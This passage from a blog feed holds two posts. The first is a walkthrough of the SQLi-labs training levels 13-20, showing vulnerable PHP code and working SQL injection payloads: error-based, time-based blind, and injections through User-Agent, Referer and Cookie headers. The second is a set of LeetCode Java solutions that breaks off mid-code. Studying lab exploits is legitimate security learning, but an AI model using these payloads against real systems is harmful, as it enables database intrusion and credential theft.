class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&#x27;) and extractvalue(1,concat(0x7e,version(),0x7e))#</span><br></pre></td></tr></table></figure><p>Less-14：查询参数两边添加了双引号，所以添加双引号进行闭合，但还是使用报错注入，源码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">   // connectivity</span><br><span class="line">   $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">   $passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;;</span><br><span class="line">   @$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;</span><br><span class="line">   $result=mysql_query($sql);</span><br><span class="line">   $row = mysql_fetch_array($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e))#</span><br></pre></td></tr></table></figure><h1 id="Less-15-16"><a href="#Less-15-16" class="headerlink" title="Less-15/16"></a>Less-15/16</h1><p>Less-15：post提交方式的sql盲注，没有任何回显，报错注入也不行，可以试一试布尔时间盲注</p><p>下面两种写法都不是很通用，他需要存在uname的前提下才可以注入，所以写一个通用的（在没有waf的前提下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误的payload: uname=admin&amp;passwd=1&#x27; and if(length(database())=8, sleep(5), 1) #</span><br><span class="line">错误的payload: uname=admin&#x27; and if(length(database())=8, sleep(5), 1) #&amp;passwd=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确的payload: uname=1&#x27; and 1=2 union select 1,sleep(5) #&amp;passwd=1</span><br><span class="line">            : uname=Dhakkan and if(length(database())=8, sleep(5), 1) #&amp;passwd=1</span><br></pre></td></tr></table></figure><p>这种写法就要好一点，只需要查询返回的列相同就行</p><p>Less-16：好像是Hackbar出问题了，POST提交方式提交不上去(搞清楚了，不是hackbar的问题，如果使用hackbar的POST提交方式要将所有的参数写全)</p><p>源代码如下，因为注释了登录信息，还使用@符号抑制了sql语句报错，所以不会有任何回显，使用盲注爆破。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &quot; You Have successfully logged in &quot; ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: uname=1&quot;) and 1=2 union select 1,sleep(5) #&amp;passwd=1</span><br><span class="line">   : uname=Dhakkan&quot;) and if(length(database())=8, sleep(5), 1) #&amp;passwd=1</span><br></pre></td></tr></table></figure><p>把上面的sleep函数换成if判断语句就可以进行爆破了，但是盲注脚本还是没有写，懒狗一条，先学学sqlmap的使用方式（学玩就写）</p><h1 id="Less-17-18"><a href="#Less-17-18" class="headerlink" title="Less-17/18"></a>Less-17/18</h1><p>Less-17：基于更新语句的报错注入，审源码逻辑。有一个check_input函数，作用是去掉转意的反斜杠，确保uname没有sql注入，但是还要研究研究这个函数，感觉这关主要就是学习这个check_input函数。在检查uname之后，进行查询</p><p>关于Mysql中的update语句，如果后面不加限制条件，那么改变的是整个表的值，后面可以接and跟我们需要的报错语句，如果源代码中没有没收报错回显，那么就可以成功使用报错注入。但是这道题有个条件，那就是用户名必须存在。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: uname=Dhakkan&amp;passwd=1&#x27; and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)), 1) #</span><br></pre></td></tr></table></figure><p>Less-18：头部报错注入，使用代理提交，估计是想让我们使用burpsuite抓包修改头部代理</p><p>需要了解的知识：User Agent</p><p>这关开始的源代码写得有点意思，check_input函数没有啥变化，对uname和passwd做了处理，所以这两个参数没有了sql注入的可能性。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926150620422.png" alt="1"></p><p>这一关的前提是需要知道用户的账号和密码，可以通过前面的关卡注入出来，就不过多赘述。继续审代码，发现代码的逻辑是获取用户的IP和Uagent插入到表uagents中，且参数Uagent没有做任何处理，所以存在sql注入。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926151040526.png" alt="注入语句"></p><p>首先可以自定义插入数据: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 111&#x27;, &#x27;127.0.0.1&#x27;, &#x27;hack&#x27;) #</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926152225184.png" alt="自定义插入数据"></p><p>自定义插入数据那就是有机会进行二次注入，但是这一关是让我们直接使用报错注入来获取数据库的所有信息，所以需要另外想办法。</p><p>这里直接在uagent变量后面比和单引号，然后拼接报错语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 1&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) , 1, 1) #</span><br></pre></td></tr></table></figure><p>这一关感觉就是教你如何在insert语句下使用报错注入，修改uagent之类的抓包修改都还比较简单。</p><h1 id="Less-19-20"><a href="#Less-19-20" class="headerlink" title="Less-19/20"></a>Less-19/20</h1><p>Less-19：需要首先了解的知识<a href="http://www.ruanyifeng.com/blog/2019/06/http-referer.html">Referer</a> （中文翻译叫引荐人）-&gt; HTTP 请求的头信息里面，<code>Referer</code> 是一个常见字段，提供访问来源的信息。</p><p>其他感觉和18关差不多，都是insert语句报错注入，唯一的不同点就是修改的数据段为referer段，18关修改的是User-Agent段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 1&#x27; and updatexml(1, concat(0x7e, (select version()), 0x7e), 1) ,1 ,1) #</span><br></pre></td></tr></table></figure><p>Less-20：Cookie注入<img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926155252459.png" alt="Less-20"></p><p>登录进去后会显示Cookie信息</p><p>​    <img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926155525555.png" alt="Cookie Message"></p><p>没啥思路，看源码学习</p><p>首先还是对uname和passwd做了过滤，所有这两个参数不存在注入点，需要查找另外的注入点，通过一番抓包调试发现了注入点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">     <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">                        <span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">                                &#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . mysql_error());</span><br><span class="line">                                &#125;</span><br><span class="line">                        <span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">                                &#123;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                                &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试payload: admin&#x27; and 1=2 union select 1,2,3 # </span><br></pre></td></tr></table></figure><p>可以看到已经能够控制回显了，但是这关是要我们使用报错注入，所以方法没有对，使用报错注入来过关。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926162206933.png" alt="注入测试"></p><p>这里还有一个疑问，那就是有一个I LOVE COOKIE那个页面是怎么出来的也需要思考下。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926162333601.png" alt="i love cookie"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错注入payload: admin&#x27; and updatexml(1, concat(0x7e,(select version()), 0x7e), 1) #</span><br></pre></td></tr></table></figure><p>得到回显页面，其他的数据通过替换select version()语句得到其他信息。</p><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926205850035.png" alt="报错注入得到回显"></p><h1 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h1><p>SQLi-labs的基础关算是弄完了，但是有很多细节还没有深究，比如有很多关卡不止一种方式注入，还有很多的注入姿势没有学到，还要花时间研究研究。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;需要掌握的MySQL基本知识&quot;&gt;&lt;a href=&quot;#需要掌握的MySQL基本知识&quot; class=&quot;headerlink&quot; title=&quot;需要掌握的MySQL基本知识&quot;&gt;&lt;/a&gt;需要掌握的MySQL基本知识&lt;/h1&gt;&lt;p&gt;imformation_schema数据库中</summary>
      
    
    
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>leetcode刷题记录-2</title>
    <link href="http://example.com/37154/"/>
    <id>http://example.com/37154/</id>
    <published>2021-07-14T04:44:17.510Z</published>
    <updated>2022-01-01T09:53:14.858Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="Hanota"><a href="#Hanota" class="headerlink" title="Hanota"></a>Hanota</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428202516782.png"></p><p>经典递归问题，从这道题学到的关于递归的思想挺多的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> size, List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (size == <span class="number">1</span>)&#123;</span><br><span class="line">            C.add(A.remove(A.size() - <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        move(size - <span class="number">1</span>, A, C, B);</span><br><span class="line">        C.add(A.remove(A.size() - <span class="number">1</span>));</span><br><span class="line">        move(size - <span class="number">1</span>, B, A, C);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hanota</span><span class="params">(List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C)</span> </span>&#123;</span><br><span class="line">        move(A.size(), A, B, C);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Plaint"><a href="#Plaint" class="headerlink" title="Plaint"></a>Plaint</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428202649261.png"></p><p>经典的dfs问题，好像有一个比较高大上的名字叫做漫水算法？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span>[][] image, <span class="keyword">int</span>[][] sign, <span class="keyword">int</span> sr, <span class="keyword">int</span> sc, <span class="keyword">int</span> newColor)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sign[sr][sc]  == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">                &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">int</span> width = image.length;</span><br><span class="line">        <span class="keyword">int</span> length = image[<span class="number">0</span>].length;</span><br><span class="line"></span><br><span class="line">        sign[sr][sc] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> temp = image[sr][sc];</span><br><span class="line">        image[sr][sc] = newColor;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> row = sr + step[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> col = sc + step[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (row &gt;= width || row &lt; <span class="number">0</span> || col &gt;= length || col &lt; <span class="number">0</span> || sign[row][col] == <span class="number">1</span> || temp != image[row][col])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dfs(image, sign, row, col, newColor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] floodFill(<span class="keyword">int</span>[][] image, <span class="keyword">int</span> sr, <span class="keyword">int</span> sc, <span class="keyword">int</span> newColor) &#123;</span><br><span class="line">        <span class="keyword">int</span>[][] sign = <span class="keyword">new</span> <span class="keyword">int</span>[image.length][image[<span class="number">0</span>].length];</span><br><span class="line">        dfs(image, sign ,sr, sc, newColor);</span><br><span class="line">        <span class="keyword">return</span> image;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="岛屿数量"><a href="#岛屿数量" class="headerlink" title="岛屿数量"></a>岛屿数量</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210427092423860.png"></p><p>刷LeetCode第一次一遍过😁</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210427092622666.png"></p><ol><li>判断是否为水，或判断标记是否走过</li><li>dfs确定连在一起的岛的范围</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> height = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> width = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 上下左右改变</span></span><br><span class="line">    <span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">numIslandsDfs</span><span class="params">(<span class="keyword">char</span>[][] grid, <span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span>[][] book)</span></span>&#123;</span><br><span class="line">        <span class="comment">//如果越界就返回</span></span><br><span class="line">        <span class="keyword">if</span> (row &lt; <span class="number">0</span> || row &gt;= height || col &lt; <span class="number">0</span> || col &gt;= width)<span class="keyword">return</span>;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">// 如果是水域或者该点已经走过也返回</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (grid[row][col] == <span class="string">&#x27;0&#x27;</span> || book[row][col] == <span class="number">1</span>)<span class="keyword">return</span>;</span><br><span class="line">        book[row][col] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> post_x = row + step[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> post_y = col + step[i][<span class="number">1</span>];</span><br><span class="line">            numIslandsDfs(grid, post_x, post_y, book);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numIslands</span><span class="params">(<span class="keyword">char</span>[][] grid)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 不用直接判断孤岛</span></span><br><span class="line"><span class="comment">        * 从0开始检索，如果book数组中没有标记且是陆地，则标记book</span></span><br><span class="line"><span class="comment">        * 开始dfs检索</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        height = grid.length;</span><br><span class="line">        width = grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span> book[][]= <span class="keyword">new</span> <span class="keyword">int</span>[grid.length][grid[<span class="number">0</span>].length];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 两层for循环来遍历所有坐标</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; height; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; width; j++) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 如果该坐标为水域或者标记为1就忽略</span></span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="string">&#x27;0&#x27;</span> || book[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    numIslandsDfs(grid, i, j, book);</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="矩阵中的路径"><a href="#矩阵中的路径" class="headerlink" title="矩阵中的路径"></a>矩阵中的路径</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428201315023.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">思路如下</span><br><span class="line"></span><br><span class="line">将返回值设置为false</span><br><span class="line">如果dfs出一个完整的单词链则将返回值设置为true，并且直接break</span><br><span class="line">遍历表，只对应单词的首字符</span><br><span class="line">首字母存在就直接进行dfs遍历，遍历的方向只有四个方向</span><br><span class="line">回溯，如果道路不符合需要把之前走过的路全部清0</span><br></pre></td></tr></table></figure><p>第一次写的代码最后三个检测点死活不能过，下面贴第一次写的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 